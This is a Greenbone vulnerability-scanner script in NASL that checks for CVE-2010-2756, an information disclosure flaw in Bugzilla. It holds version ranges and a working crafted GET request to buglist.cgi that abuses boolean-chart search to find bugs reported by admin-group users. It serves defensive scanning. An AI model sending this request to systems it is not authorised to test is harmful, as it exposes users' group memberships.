# SPDX-FileCopyrightText: 2011 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:mozilla:bugzilla";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.801570");
  script_version("2025-09-22T07:08:28+0000");
  script_tag(name:"last_modification", value:"2025-09-22 07:08:28 +0000 (Mon, 22 Sep 2025)");
  script_tag(name:"creation_date", value:"2011-01-20 07:52:11 +0100 (Thu, 20 Jan 2011)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_cve_id("CVE-2010-2756");
  script_name("Bugzilla Information Disclosure Vulnerability (Feb 2008) - Active Check");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("bugzilla_detect.nasl");
  script_mandatory_keys("bugzilla/installed");
  script_require_ports("Services/www", 80);

  script_xref(name:"URL", value:"https://bugzilla.mozilla.org/show_bug.cgi?id=417048");
  script_xref(name:"URL", value:"https://web.archive.org/web/20111230105100/http://secunia.com/advisories/41128");
  script_xref(name:"URL", value:"https://web.archive.org/web/20210121203108/http://www.securityfocus.com/bid/42275");
  script_xref(name:"URL", value:"http://www.vupen.com/english/advisories/2010/2205");
  script_xref(name:"URL", value:"http://www.vupen.com/english/advisories/2010/2035");
  script_xref(name:"URL", value:"http://www.vupen.com/english/advisories/2010/2035");

  script_tag(name:"summary", value:"Bugzilla is prone to an information disclosure vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"The flaw is due to an error in 'Search.pm' which allows remote
  attackers to determine the group memberships of arbitrary users via vectors involving the Search
  interface, boolean charts, and group-based pronouns.");

  script_tag(name:"impact", value:"Successful exploitation will allow attackers to search for bugs
  that were reported by users belonging to one more groups.");

  script_tag(name:"affected", value:"Bugzilla versions 2.19.1 through 3.2.7, 3.3.1 through 3.4.7,
  3.5.1 through 3.6.1 and 3.7 through 3.7.2.");

  script_tag(name:"solution", value:"Update to version 3.2.8, 3.4.8, 3.6.2, 3.7.3 or later.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("version_func.inc");
include("http_keepalive.inc");

if (!port = get_app_port(cpe:CPE))
  exit(0);

if (!infos = get_app_version_and_location(cpe:CPE, port:port, exit_no_version:TRUE))
  exit(0);

host = http_host_name(port:port);

vers = infos["version"];
dir = infos["location"];

if (version_in_range(version:vers, test_version:"3.7", test_version2:"3.7.2") ||
    version_in_range(version:vers, test_version:"3.5.1", test_version2:"3.6.1") ||
    version_in_range(version:vers, test_version:"3.3.1", test_version2:"3.4.7") ||
    version_in_range(version:vers, test_version:"2.19.1", test_version2:"3.2.7")) {

  exploit = "/buglist.cgi?query_format=advanced&bug_status=CLOSED&" +
            "field0-0-0%3Dreporter%26type0-0-0%3Dequals%26value0-0-0"+
            "%3D%25group.admin%25";

  if(dir == "/")
    dir = "";

  url = dir + exploit;

  req = string("GET ", url, " HTTP/1.1\r\n",
               "Host: ", host, "\r\n",
               "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n",
               "Accept-Language: en-us,en;q=0.5\r\n",
               "Accept-Encoding: gzip,deflate\r\n",
               "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n",
               "Keep-Alive: 300\r\n",
               "Connection: keep-alive\r\n\r\n");
  resp = http_keepalive_send_recv(port:port, data:req);

  if (resp) {
     if (eregmatch(pattern:"field0-0-0%3Dreporter%26type0-0-0%3Dequals%26value0-0-0%3D%25group.admin%25/i",
                   string:resp, icase:TRUE)) {
       report = http_report_vuln_url(port:port, url:url);
       security_message(port:port, data:report);
       exit(0);
     }
  }
}

exit(0);
